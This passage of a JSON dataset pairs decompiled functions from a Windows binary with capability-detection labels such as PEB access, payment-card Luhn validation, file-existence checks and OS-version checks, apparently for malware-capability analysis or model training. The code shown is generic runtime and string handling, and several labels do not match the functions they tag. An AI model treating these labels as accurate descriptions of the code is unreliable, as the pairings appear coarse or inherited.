+ arg1_01 + (iVar14 * -0x30 - puVar15) + -8;\n            do {\n                *arg1_01 = *(puVar13 + -5);\n                *(puVar15 + iVar8 + 0xc + puVar13) = *(puVar13 + -0x24);\n                *(puVar15 + iVar8 + 0x10 + puVar13) = *(puVar13 + -4);\n                *(puVar15 + iVar8 + 0x28 + puVar13) = 0;\n                *(puVar15 + iVar8 + 0x30 + puVar13) = 0;\n                uVar4 = *(puVar13 + -0x14);\n                uVar5 = *(puVar13 + -2);\n                uVar6 = *(puVar13 + -0xc);\n                puVar17 = puVar15 + iVar8 + 0x18 + puVar13;\n                *puVar17 = *(puVar13 + -3);\n                puVar17[1] = uVar4;\n                puVar17[2] = uVar5;\n                puVar17[3] = uVar6;\n                uVar4 = *(puVar13 + -4);\n                uVar5 = *puVar13;\n                uVar6 = *(puVar13 + 4);\n                puVar17 = puVar15 + iVar8 + 0x28 + puVar13;\n                *puVar17 = *(puVar13 + -1);\n                puVar17[1] = uVar4;\n                puVar17[2] = uVar5;\n                puVar17[3] = uVar6;\n                puVar13[-1] = 0;\n                *puVar13 = 7;\n                *(puVar13 + -3) = 0;\n                arg1_01 = arg1_01 + 0xc;\n                puVar12 = puVar13 + 1;\n                puVar13 = puVar13 + 6;\n            } while (puVar12 != puVar10);\n        }\n    }\n    fcn.180013bc0(arg1_01, arg1_01);\n    if (*arg1 != 0) {\n        fcn.180013bc0(*arg1, arg1[1]);\n        iVar8 = *arg1;\n        iVar11 = iVar8;\n        if ((0xfff < ((arg1[2] - iVar8) / 0x30) * 0x30) && (iVar11 = *(iVar8 + -8),  0x1f < (iVar8 - iVar11) - 8U)) {\ncode_r0x000180063f6d:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            puVar15 = (*pcVar3)();\n            return puVar15;\n        }\n        fcn.18008fb24(iVar11);\n    }\n    *arg1 = puVar15;\n    arg1[1] = puVar15 + uVar1 * 0xc;\n    arg1[2] = puVar15 + uVar7 * 0xc;\n    return puVar2;\n}\n",
        "token_count": 2332
    },
    "1800b22b": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800b22b0(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001800b22b4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de508)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 76
    },
    "180001f9": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180001f90(code **arg1, int64_t **arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    int64_t **arg1_00;\n    int64_t **ppiVar8;\n    int64_t *piVar9;\n    int64_t arg1_01;\n    uchar auStack200 [32];\n    ulong uStack168;\n    int64_t **ppiStack152;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    ulong uStack112;\n    uchar auStack104 [32];\n    int64_t *piStack72;\n    uint uStack64;\n    uint uStack60;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack112 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack200;\n    ppiStack152 = arg1;\n    arg1_00 = fcn.18000de50(auStack104, arg3);\n    piStack72 = *arg2;\n    uStack64 = *(arg2 + 1);\n    uStack60 = *(arg2 + 0xc);\n    piVar9 = arg1_00[2];\n    ppiStack152 = arg1_00;\n    if (piVar9 != NULL) {\n        if (arg1_00[3] - piVar9 < 2) {\n            uStack168 = 2;\n            fcn.180014270(arg1_00, 2, 0, 0x1800f454c);\n        }\n        else {\n            arg1_00[2] = piVar9 + 2;\n            ppiVar8 = arg1_00;\n            if (0xf < arg1_00[3]) {\n                ppiVar8 = *arg1_00;\n            }\n            *(ppiVar8 + piVar9) = 0x203a;\n            (ppiVar8 + 2)[piVar9] = 0;\n        }\n    }\n    (**(*CONCAT44(uStack60, uStack64) + 0x10))(CONCAT44(uStack60, uStack64), &piStack72, piStack72 & 0xffffffff);\n    fcn.18000dc30(arg1_00, &piStack72);\n    if (0xf < uStack48) {\n        piVar9 = piStack72;\n        if ((0xfff < uStack48 + 1) && (piVar9 = piStack72[-1],  0x1f < piStack72 + (-8 - piVar9)))\n        goto code_r0x00018000218e;\n        fcn.18008fb24(piVar9);\n    }\n    uStack144 = *arg1_00;\n    uStack140 = *(arg1_00 + 4);\n    piVar7 = *arg1_00;\n    uStack136 = *(arg1_00 + 1);\n    uStack132 = *(arg1_00 + 0xc);\n    uStack128 = *(arg1_00 + 2);\n    uStack124 = *(arg1_00 + 0x14);\n    uStack120 = *(arg1_00 + 3);\n    uStack116 = *(arg1_00 + 0x1c);\n    piVar9 = arg1_00[3];\n    arg1_00[2] = NULL;\n    arg1_00[3] = 0xf;\n    *arg1_00 = 0;\n    piStack72 = &uStack144;\n    if (0xf < piVar9) {\n        piStack72 = piVar7;\n    }\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack64 = CONCAT31(uStack64._1_3_, 1);\n    fcn.1800adaec(&piStack72, arg1 + 1);\n    *arg1 = vtable.std::runtime_error.0;\n    uVar6 = CONCAT44(uStack116, uStack120);\n    if (0xf < uVar6) {\n        iVar5 = CONCAT44(uStack140, uStack144);\n        arg1_01 = iVar5;\n        if (0xfff < uVar6 + 1) {\n            arg1_01 = *(iVar5 + -8);\n            if (0x1f < (iVar5 - arg1_01) - 8U) {\n                fcn.1800b3528(arg1_01, uVar6 + 0x28);\ncode_r0x00018000218e:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_01);\n    }\n    *arg1 = vtable.std::_System_error.0;\n    uVar2 = *(arg2 + 4);\n    uVar3 = *(arg2 + 1);\n    uVar4 = *(arg2 + 0xc);\n    *(arg1 + 3) = *arg2;\n    *(arg1 + 0x1c) = uVar2;\n    *(arg1 + 4) = uVar3;\n    *(arg1 + 0x24) = uVar4;\n    fcn.18008fb00(uStack40 ^ auStack200);\n    return;\n}\n",
        "token_count": 1264
    },
    "180003d3": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.180003d30(uint32_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int16_t iVar3;\n    \n    iVar2 = arg2 - arg1 >> 1;\n    if (1 < iVar2) {\n        uVar1 = *arg1;\n        if ((uVar1 & 0xffffffdf) - 0x3a0041 < 0x1a) {\n            arg1 = arg1 + 1;\n        }\n        else if ((uVar1 == 0x5c) || (uVar1 == 0x2f)) {\n            iVar3 = uVar1 >> 0x10;\n            if ((((iVar2 < 4) || ((*(arg1 + 6) != 0x5c && (*(arg1 + 6) != 0x2f)))) ||\n                ((iVar2 != 4 && ((*(arg1 + 2) == 0x5c || (*(arg1 + 2) == 0x2f)))))) ||\n               ((((iVar3 != 0x5c && (iVar3 != 0x2f)) || ((*(arg1 + 1) != 0x3f && (*(arg1 + 1) != 0x2e)))) &&\n                ((iVar3 != 0x3f || (*(arg1 + 1) != 0x3f)))))) {\n                if ((2 < iVar2) &&\n                   ((((iVar3 == 0x5c || (iVar3 == 0x2f)) && (*(arg1 + 1) != 0x5c)) && (*(arg1 + 1) != 0x2f)))) {\n                    arg1 = arg1 + 6;\n                    if (arg1 == arg2) {\n                        return arg1;\n                    }\n                    do {\n                        if ((*arg1 == 0x5c) || (*arg1 == 0x2f)) break;\n                        arg1 = arg1 + 2;\n                    } while (arg1 != arg2);\n                }\n            }\n            else {\n                arg1 = arg1 + 6;\n            }\n        }\n    }\n    for (; (arg1 != arg2 && ((*arg1 == 0x5c || (*arg1 == 0x2f)))); arg1 = arg1 + 2) {\n    }\n    return arg1;\n}\n",
        "token_count": 527
    },
    "18000856": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180008560(ulong noname_0, ulong arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    int64_t **arg1;\n    uchar *puVar4;\n    int64_t *arg1_00;\n    int64_t iVar5;\n    ulong arg2_00;\n    uchar *puVar6;\n    int64_t iVar7;\n    uchar *puVar8;\n    int64_t **ppiVar9;\n    uchar uStack168;\n    unkbyte7 Stack167;\n    ulong uStack152;\n    uint64_t uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    ulong uStack72;\n    uchar *puStack64;\n    int64_t **ppiStack56;\n    uchar auStack48 [40];\n    \n    uStack72 = 0xfffffffffffffffe;\n    puStack64 = auStack48;\n    arg1 = fcn.18000de50(auStack48, 0x1801254f8);\n    if (arg2 == 2) {\n        iVar5 = 0x1800f472c;\n    }\n    else {\n        iVar5 = 0x1800f474c;\n        if (arg2 == 1) {\n            iVar5 = 0x1800f473c;\n        }\n    }\n    uStack88 = *0x180101910;\n    uStack84 = *0x180101914;\n    uStack80 = *0x180101918;\n    uStack76 = *0x18010191c;\n    uStack104 = 0;\n    iVar7 = -1;\n    do {\n        iVar7 = iVar7 + 1;\n    } while (*(iVar5 + iVar7) != '\\0');\n    ppiStack56 = arg1;\n    fcn.180011120(&uStack104, iVar5, iVar7);\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    fcn.180011120(&uStack136, 0x1800f4750, 0x10);\n    uStack152 = CONCAT44(*0x180101914, *0x180101910);\n    uStack144 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack168 = 0;\n    fcn.180011120(&uStack168, 0x1800f4768, 0xb);\n    if ((arg1[2] == NULL) && (arg1 != 0x1801255d8)) {\n        arg2_00 = 0x1801255d8;\n        if (0xf < *0x1801255f0) {\n            arg2_00 = *0x1801255d8;\n        }\n        fcn.180011120(arg1, arg2_00, *0x1801255e8);\n    }\n    ppiVar9 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar9 = *arg1;\n    }\n    puVar8 = &uStack104;\n    if (0xf < CONCAT44(uStack76, uStack80)) {\n        puVar8 = CONCAT71(Stack103, uStack104);\n    }\n    puVar6 = &uStack136;\n    if (0xf < uStack112) {\n        puVar6 = CONCAT71(Stack135, uStack136);\n    }\n    puVar4 = &uStack168;\n    if (0xf < uStack144) {\n        puVar4 = CONCAT71(Stack167, uStack168);\n    }\n    (**0x1800de490)(puVar4, puVar6, puVar8, ppiVar9);\n    if (arg1[3] < 0x10) {\ncode_r0x0001800086ee:\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        if (uStack144 < 0x10) {\ncode_r0x00018000873c:\n            uStack152 = CONCAT44(*0x180101914, *0x180101910);\n            uStack144 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack168 = 0;\n            if (0xf < uStack112) {\n                iVar7 = CONCAT71(Stack135, uStack136);\n                iVar5 = iVar7;\n                if ((0xfff < uStack112 + 1) && (iVar5 = *(iVar7 + -8),  0x1f < (iVar7 - iVar5) - 8U))\n                goto code_r0x0001800087f3;\n                fcn.18008fb24(iVar5);\n            }\n            uStack120 = CONCAT44(*0x180101914, *0x180101910);\n            uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack136 = 0;\n            uVar3 = CONCAT44(uStack76, uStack80);\n            if (uVar3 < 0x10) {\n                return;\n            }\n            iVar7 = CONCAT71(Stack103, uStack104);\n            iVar5 = iVar7;\n            if (uVar3 + 1 < 0x1000) {\ncode_r0x0001800087c7:\n                fcn.18008fb24(iVar5);\n                return;\n            }\n            iVar5 = *(iVar7 + -8);\n            if ((iVar7 - iVar5) - 8U < 0x20) goto code_r0x0001800087c7;\n            fcn.1800b3528(uStack120, iVar5, uVar3 + 0x28);\n        }\n        else {\n            iVar7 = CONCAT71(Stack167, uStack168);\n            iVar5 = iVar7;\n            if ((uStack144 + 1 < 0x1000) || (iVar5 = *(iVar7 + -8),  (iVar7 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018000873c;\n            }\n        }\n        fcn.1800b3528();\n    }\n    else {\n        piVar1 = *arg1;\n        arg1_00 = piVar1;\n        if ((arg1[3] + 1U < 0x1000) || (arg1_00 = piVar1[-1],  piVar1 + (-8 - arg1_00) < 0x20)) {\n            fcn.18008fb24(arg1_00);\n            goto code_r0x0001800086ee;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x0001800087f3:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1607
    },
    "18000880": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.180008800(ulong noname_0, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ulong *puVar4;\n    ulong uVar5;\n    uchar *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    bool bVar9;\n    ulong var_bp_20h;\n    ulong var_40h;\n    ulong var_bp_48h;\n    ulong var_bp_58h;\n    ulong var_60h;\n    ulong var_68h;\n    uchar auStack392 [32];\n    uchar *puStack360;\n    ulong uStack352;\n    uchar *puStack344;\n    uchar uStack336;\n    unkbyte7 Stack335;\n    ulong uStack320;\n    uint64_t uStack312;\n    uchar uStack304;\n    unkbyte7 Stack303;\n    ulong uStack288;\n    uint64_t uStack280;\n    uchar uStack272;\n    unkbyte7 Stack271;\n    ulong uStack256;\n    uint64_t uStack248;\n    uchar uStack240;\n    unkbyte7 Stack239;\n    ulong uStack224;\n    uint64_t uStack216;\n    uchar uStack208;\n    unkbyte7 Stack207;\n    ulong uStack192;\n    uint64_t uStack184;\n    uchar uStack176;\n    unkbyte7 Stack175;\n    ulong uStack160;\n    uint64_t uStack152;\n    ulong uStack144;\n    uchar auStack136 [8];\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_68h_2;\n    uchar auStack104 [16];\n    ulong var_bp_50h;\n    int64_t *piStack72;\n    ulong *var_bp_38h;\n    ulong var_bp_30h;\n    int64_t var_bp_28h;\n    uint64_t uStack40;\n    uint64_t var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puStack344 = auStack136;\n    uStack144 = 0xfffffffffffffffe;\n    var_18h = *0x180123080 ^ auStack392;\n    piStack72 = arg2;\n    uStack352 = fcn.18000de50(puStack344, 0x1801254f8);\n    uStack256 = CONCAT44(*0x180101914, *0x180101910);\n    uStack248 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack272 = 0;\n    fcn.180011120(&uStack272, 0x1800f4764, 2);\n    uStack288 = CONCAT44(*0x180101914, *0x180101910);\n    uStack280 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack304 = 0;\n    fcn.180011120(&uStack304, 0x1800f4778, 0x10);\n    uStack320 = CONCAT44(*0x180101914, *0x180101910);\n    uStack312 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack336 = 0;\n    puVar6 = &uStack336;\n    fcn.180011120(puVar6, 0x1800f4790, 0xb);\n    puStack360 = &uStack272;\n    fcn.180004b90(puVar6, &var_bp_38h, &uStack336, &uStack304);\n    if (uStack312 < 0x10) {\ncode_r0x000180008934:\n        uStack320 = CONCAT44(*0x180101914, *0x180101910);\n        uStack312 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack336 = 0;\n        if (0xf < uStack280) {\n            iVar8 = CONCAT71(Stack303, uStack304);\n            iVar7 = iVar8;\n            if ((uStack280 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180008984;\n            }\n            goto code_r0x000180008d1a;\n        }\ncode_r0x000180008984:\n        uStack288 = CONCAT44(*0x180101914, *0x180101910);\n        uStack280 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack304 = 0;\n        if (0xf < uStack248) {\n            iVar8 = CONCAT71(Stack271, uStack272);\n            iVar7 = iVar8;\n            if ((uStack248 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800089d3;\n            }\n            goto code_r0x000180008d20;\n        }\ncode_r0x0001800089d3:\n        uStack256 = CONCAT44(*0x180101914, *0x180101910);\n        uStack248 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack272 = 0;\n        puVar4 = &var_bp_38h;\n        if (0xf < uStack40) {\n            puVar4 = var_bp_38h;\n        }\n        if (var_bp_28h != 2) {\ncode_r0x000180008c5e:\n            if (0xf < uStack40) {\n                puVar4 = var_bp_38h;\n                if (0xfff < uStack40 + 1) {\n                    puVar4 = var_bp_38h[-1];\n                    if (0x1f < var_bp_38h + (-8 - puVar4)) {\n                        fcn.1800b3528(uStack256, var_bp_28h, uStack40 + 0x28);\ncode_r0x000180008d08:\n                        fcn.1800b3528();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(puVar4);\n            }\n            uVar1 = arg2[3];\n            if (uVar1 < 0x10) goto code_r0x000180008cc8;\n            iVar7 = *arg2;\n            iVar8 = iVar7;\n            if (0xfff < uVar1 + 1) {\n                iVar8 = *(iVar7 + -8);\n                if (0x1f < (iVar7 - iVar8) - 8U) {\n                    fcn.1800b3528(iVar7 - iVar8, uVar1 + 0x28);\n                    goto code_r0x000180008d14;\n                }\n            }\ncode_r0x000180008cc3:\n            fcn.18008fb24(iVar8);\ncode_r0x000180008cc8:\n            *arg2 = 0;\n            arg2[3] = 0xf;\n            arg2[2] = 0;\n            fcn.18008fb00(var_18h ^ auStack392);\n            return;\n        }\n        bVar9 = *puVar4 < 0x46;\n        if ((*puVar4 == 0x46) && (bVar9 = *(puVar4 + 1) < 0x54,  *(puVar4 + 1) == 0x54)) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = -bVar9 | 1;\n        }\n        if (uVar3 != 0) goto code_r0x000180008c5e;\n        puStack344 = auStack104;\n        uVar5 = fcn.18000de50(auStack104, 0x1801255d8);\n        uStack192 = CONCAT44(*0x180101914, *0x180101910);\n        uStack184 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack208 = 0;\n        fcn.180011120(&uStack208, 0x1800f479c, 1);\n        uStack224 = CONCAT44(*0x180101914, *0x180101910);\n        uStack216 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack240 = 0;\n        puVar6 = &uStack240;\n        fcn.180011120(puVar6, 0x1800f47a0, 0xe);\n        puStack360 = &uStack208;\n        uStack352 = uVar5;\n        fcn.180004b90(puVar6, &uStack176, arg2, &uStack240);\n        if (0xf < uStack152) {\n            iVar8 = CONCAT71(Stack175, uStack176);\n            iVar7 = iVar8;\n            if ((uStack152 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180008b14;\n            }\n            goto code_r0x000180008d26;\n        }\ncode_r0x000180008b14:\n        uStack160 = CONCAT44(*0x180101914, *0x180101910);\n        uStack152 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack176 = 0;\n        if (0xf < uStack216) {\n            iVar8 = CONCAT71(Stack239, uStack240);\n            iVar7 = iVar8;\n            if ((uStack216 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180008b60;\n            }\n            goto code_r0x000180008d2c;\n        }\ncode_r0x000180008b60:\n        uStack224 = CONCAT44(*0x180101914, *0x180101910);\n        uStack216 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack240 = 0;\n        if (uStack184 < 0x10) {\ncode_r0x000180008bac:\n            uStack192 = CONCAT44(*0x180101914, *0x180101910);\n            uStack184 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack208 = 0;\n            if (0xf < uStack40) {\n                puVar4 = var_bp_38h;\n                if ((0xfff < uStack40 + 1) && (puVar4 = var_bp_38h[-1],  0x1f < var_bp_38h + (-8 - puVar4)))\n                goto code_r0x000180008d38;\n                fcn.18008fb24(puVar4);\n            }\n            if (arg2[3] < 0x10) goto code_r0x000180008cc8;\n            iVar7 = *arg2;\n            iVar8 = iVar7;\n            if ((0xfff < arg2[3] + 1U) && (iVar8 = *(iVar7 + -8),  0x1f < (iVar7 - iVar8) - 8U))\n            goto code_r0x000180008d08;\n            goto code_r0x000180008cc3;\n        }\n        iVar8 = CONCAT71(Stack207, uStack208);\n        iVar7 = iVar8;\n        if ((uStack184 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x000180008bac;\n        }\n    }\n    else {\n        iVar8 = CONCAT71(Stack335, uStack336);\n        iVar7 = iVar8;\n        if ((uStack312 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x000180008934;\n        }\ncode_r0x000180008d14:\n        fcn.1800b3528();\ncode_r0x000180008d1a:\n        fcn.1800b3528();\ncode_r0x000180008d20:\n        fcn.1800b3528();\ncode_r0x000180008d26:\n        fcn.1800b3528();\ncode_r0x000180008d2c:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180008d38:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 3047
    },
    "18001183": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180011830(int64_t *arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar auStack104 [32];\n    int64_t *piStack72;\n    int64_t iStack56;\n    uchar auStack48 [32];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack104;\n    if ((arg1[0xd] == 0) || (*(arg1 + 0x72) == '\\0')) {\n        fcn.18008fb00(uStack16 ^ auStack104);\n        return;\n    }\n    iVar1 = (**(*arg1 + 0x18))(arg1, 0xffff);\n    if (iVar1 != -1) {\n        piStack72 = &iStack56;\n        iVar2 = (**(*arg1[0xd] + 0x40))(arg1[0xd], arg1 + 0x74, auStack48, &uStack16);\n        if (iVar2 == 0) {\n            *(arg1 + 0x72) = 0;\n        }\n        else if (iVar2 != 1) {\n            if (iVar2 == 3) {\n                *(arg1 + 0x72) = 0;\n            }\n            goto code_r0x0001800118ae;\n        }\n        if (iStack56 - auStack48 != 0) {\n            fcn.1800b2518(auStack48, 1, iStack56 - auStack48, arg1[0x10]);\n        }\n    }\ncode_r0x0001800118ae:\n    fcn.18008fb00(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 377
    },
    "180011a3": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180011a30(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack104 [32];\n    int64_t *piStack72;\n    int64_t iStack56;\n    uchar auStack48 [32];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack104;\n    if ((arg1[0xd] == 0) || (*(arg1 + 0x71) == '\\0')) {\n        fcn.18008fb00(uStack16 ^ auStack104);\n        return;\n    }\n    iVar1 = (**(*arg1 + 0x18))(arg1, 0xffffffff);\n    if (iVar1 != -1) {\n        piStack72 = &iStack56;\n        iVar1 = (**(*arg1[0xd] + 0x40))(arg1[0xd], arg1 + 0x74, auStack48, &uStack16);\n        if (iVar1 == 0) {\n            *(arg1 + 0x71) = 0;\n        }\n        else if (iVar1 != 1) {\n            if (iVar1 == 3) {\n                *(arg1 + 0x71) = 0;\n            }\n            goto code_r0x000180011aac;\n        }\n        if (iStack56 - auStack48 != 0) {\n            fcn.1800b2518(auStack48, 1, iStack56 - auStack48, arg1[0x10]);\n        }\n    }\ncode_r0x000180011aac:\n    fcn.18008fb00(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 369
    },
    "18001515": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180015150(uint16_t **arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint16_t *puVar4;\n    bool bVar5;\n    \n    if (*arg1 == arg1[2]) {\n        *(arg1 + 0xf) = 0xffff;\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar1 = **arg1;\n        *(arg1 + 0xf) = uVar1;\n        iVar3 = fcn.1800add0c(\"()$^.*+?[]|\\\\-{},:=!\\n\\r\\b\", uVar1);\n        if (iVar3 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = *(arg1 + 0xf);\n        }\n    }\n    *(arg1 + 0x7c) = uVar2;\n    if (0x73 < *(arg1 + 0xf) - 10) {\n        return;\n    }\n    // switch table (116 cases) at 0x18001535c\n    switch(*(*((*(arg1 + 0xf) - 10) + 0x180015384) * 4 + 0x18001535c) + 0x180000000) {\n    case 0x1800151c8:\n        puVar4 = *arg1 + 1;\n        if (puVar4 == arg1[2]) {\n            return;\n        }\n        if (((*(arg1 + 0x10) & 8) != 0) || ((uVar1 = *puVar4,  uVar1 != 0x28 && (uVar1 != 0x29)))) {\n            if ((*(arg1 + 0x10) & 0x10) != 0) {\n                return;\n            }\n            uVar1 = *puVar4;\n            if ((uVar1 != 0x7b) && (uVar1 != 0x7d)) {\n                return;\n            }\n        }\n        *(arg1 + 0xf) = uVar1;\n        *(arg1 + 0x7c) = uVar1;\n        return;\n    case 0x18001522d:\n        if ((*(arg1 + 0x10) & 4) == 0) {\n            return;\n        }\n        if (*(arg1 + 0x1c) != 0) {\n            return;\n        }\n        *(arg1 + 0x7c) = 0x7c;\n        return;\n    case 0x180015255:\n        bVar5 = (*(arg1 + 0x10) & 8) == 0;\n        break;\n    case 0x180015261:\n        bVar5 = (*(arg1 + 0x10) & 0x10) == 0;\n        break;\n    case 0x18001526d:\n        if ((*(arg1 + 0x10) & 0x4000000) == 0) {\n            return;\n        }\n        uVar2 = *(arg1[9] + 4);\n        if ((0x14 < uVar2) || ((0x102100U >> (uVar2 & 0x1f) & 1) == 0)) {\n            if (uVar2 != 2) {\n                return;\n            }\n            uVar2 = *(*(arg1[9] + 0xc) + 8);\n            if (0x14 < uVar2) {\n                return;\n            }\n            if ((0x102100U >> (uVar2 & 0x1f) & 1) == 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018001534c;\n    case 0x1800152c7:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        uVar2 = *(arg1[9] + 4);\n        if ((uVar2 < 0x15) && ((0x102100U >> (uVar2 & 0x1f) & 1) != 0)) {\n            return;\n        }\n        if ((uVar2 == 2) && (uVar2 = *(*(arg1[9] + 0xc) + 8),  uVar2 < 0x15)) {\n            if ((0x102100U >> (uVar2 & 0x1f) & 1) != 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018001534c;\n    case 0x18001530d:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        if (*arg1 + 1 == arg1[2]) {\n            return;\n        }\n        if ((*arg1)[1] == 10) {\n            return;\n        }\n        *(arg1 + 0x7c) = 0;\n        return;\n    case 0x18001533a:\n        bVar5 = (*(arg1 + 0x10) & 1) == 0;\n        break;\n    case 0x180015343:\n        bVar5 = (*(arg1 + 0x10) & 2) == 0;\n        break;\n    case 